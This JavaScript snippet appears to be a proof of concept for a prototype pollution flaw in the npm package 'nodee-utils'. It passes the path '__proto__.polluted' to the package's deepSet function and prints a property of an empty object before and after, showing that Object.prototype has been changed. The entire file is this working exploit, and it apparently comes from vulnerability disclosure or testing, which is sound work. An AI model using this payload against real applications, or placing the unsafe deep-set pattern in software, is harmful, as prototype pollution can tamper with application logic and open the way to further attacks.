var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {object} = require('nodee-utils');
var obj = {};
console.log({}.polluted);
object.deepSet(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);